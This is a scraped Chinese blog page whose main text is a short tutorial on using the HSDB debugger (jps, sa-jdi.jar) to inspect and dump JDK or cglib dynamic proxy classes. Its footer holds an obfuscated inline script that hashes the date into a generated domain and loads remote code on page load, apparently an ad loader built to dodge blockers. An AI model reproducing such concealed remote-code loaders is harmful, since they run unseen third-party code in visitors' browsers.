		
	</header>
	<div class="content list__excerpt post__content clearfix">
		利用JVM工具：HSDB查看动态代理类对象的实现：既可以看jdk生成的动态代理对象，也可以查看cglib生成的动态代理对象。
1. 获取PID
断点，运行项目获取
在获取动态代理类处设置断点，使用jps获取PID，我的PID为：3755 2. 执行命令，获取HSDB（HostSpot Debugger）工具：
java -classpath "%JAVA_HOME%/lib/sa-jdi.jar" sun.jvm.hotspot.HSDB 说明：执行上面语句可能报如下错误：
错误: 找不到或无法加载主类 sun.jvm.hotspot.HSDB 这个时候，请找到sa-jdi.jar的文件路径，使用全路径执行，比如我执行权路径的语句为：
java -classpath "/Library/Java/JavaVirtualMachines/jdk1.8.0_321.jdk/Contents/Home/lib/sa-jdi.jar" sun.jvm.hotspot.HSDB 3. 将PID填入HSDB工具
4.获取代理对象
查看代理对象地址，可以看到此处为$Proxy228@24671，取@前面的值：$Proxy228
使用HSDB搜索此对象：
5. 生成代理对象
6.查看生成的代理对象
生成的对象一般位于项目的classpath路径下，实在找不到，全磁盘搜索Proxy关键词。即可找到：
参考：
填坑之动态代理生成的代理类文件在哪？_Genterator的博客-CSDN博客_动态代理生成的类在哪里
找不到或无法加载主类 sun.jvm.hotspot.HSDB_普通网友的博客-CSDN博客
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/125/">«</a>
	<span class="pagination__item pagination__item--current">126/306</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/127/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>